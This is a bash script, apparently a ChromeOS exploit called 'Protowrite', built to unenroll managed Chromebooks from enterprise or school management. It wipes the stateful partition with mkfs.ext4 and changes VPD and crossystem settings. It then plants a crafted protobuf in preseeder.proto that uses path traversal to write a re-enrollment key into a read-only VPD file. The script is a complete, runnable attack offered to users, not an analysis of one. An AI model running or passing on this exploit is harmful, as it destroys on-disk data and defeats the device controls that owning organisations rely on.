#!/bin/bash

stateful_mount=$(mktemp -d)
metadata=$(mktemp -d)
fail(){
	printf "$1\n"
	printf "exiting...\n"
	exit 1
}

proto_gaming(){
	printf '\x0a\x7f\x0a\x23unencrypted/../../../run/vpd/ro.txt\x10\x54\x1a\x56\x12\x54re_enrollment_key="'"$(hexdump -e '1/1 "%02x"' -v -n 32 /dev/urandom)"'"' | base64 -w0
}

get_fixed_dst_drive() {
	local dev
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		for dev in /sys/block/sd* /sys/block/mmcblk*; do
			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
				continue
			fi
			if [ -f "${dev}/device/type" ]; then
				case "$(cat "${dev}/device/type")" in
				SD*)
					continue;
					;;
				esac
			fi
			DEFAULT_ROOTDEV="{$dev}"
		done
	fi
	if [ -z "${DEFAULT_ROOTDEV}" ]; then
		dev=""
	else
		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
		if [ ! -b "${dev}" ]; then
			dev=""
		fi
	fi
	echo "${dev}"
}

wipeandmountstate(){
    vgchange -ay
    volgroup=$(vgscan | grep "Found volume group" | awk '{print $4}' | tr -d '"')
	if [ -b "/dev/$volgroup/unencrypted" ]; then
		echo "found volume group: $volgroup"
		mkdir "$stateful_mount"
		mkfs.ext4 -F /dev/$volgroup/unencrypted
        mount /dev/$volgroup/unencrypted "$stateful_mount"
	else
		echo "lvm fail, falling back on p1"
		mkfs.ext4 -F "$intdis_prefix"1 || fail "no stateful could be found/wiped"
        mount "$intdis_prefix"1 "$stateful_mount"
	fi
}

checkcurrentstate(){
    echo "Checking current state..."
    vpdoutput=$(vpd -i RW_VPD -g "powerwash_count" 2>/dev/null)
    if [ "$vpdoutput" = "1" ]; then
        echo "Starting Part 2"
        part2
    else
        echo "Starting Part 1"
        part1
    fi
}

part1(){
    wipeandmountstate
    mkdir -p "$stateful_mount"/unencrypted
    touch "$stateful_mount"/unencrypted/.default_key_stateful_migration
    vpd -i RW_VPD -s "powerwash_count"="1"
    crossystem disable_dev_request=1
    umount "$stateful_mount"
    echo "Rebooting, please re-run this script after the update finishes. It may update multiple times, you need to wait for all of them to finish"
    sleep 10
    reboot -f
}

part2(){
    mkdir "$metadata"
    mount "$intdis_prefix"11 "$metadata"
    chattr -i "$metadata"/preseeder.proto
    rm -f "$metadata"/preseeder.proto
    proto_gaming | tee "$metadata"/preseeder.proto
    chattr +i "$metadata"/preseeder.proto
    sync
    umount "$metadata"
    sync
    vpd -i RW_VPD -d "powerwash_count"
    crossystem disable_dev_request=1
    echo "Go through setup, you will be unenrolled"
    sleep 5
    reboot -f
}

main(){
    . /usr/sbin/write_gpt.sh
    load_base_vars
    intdis=$(get_fixed_dst_drive)
	if echo "$intdis" | grep -q '[0-9]$'; then
		intdis_prefix="$intdis"p
	else
		intdis_prefix="$intdis"
	fi
    clear
	echo "Script by con, exploit and script updates made by emery"
	echo "Protowrite: root file write > unpatch Quicksilver > unenrollment"
	echo "This will unenroll your device"
	echo "Continue? (y/N)"
	read -r action
	case "$action" in
		[yY]) : ;;
		*) echo "Abort."; exit 1 ;;
	esac
    checkcurrentstate
}

main
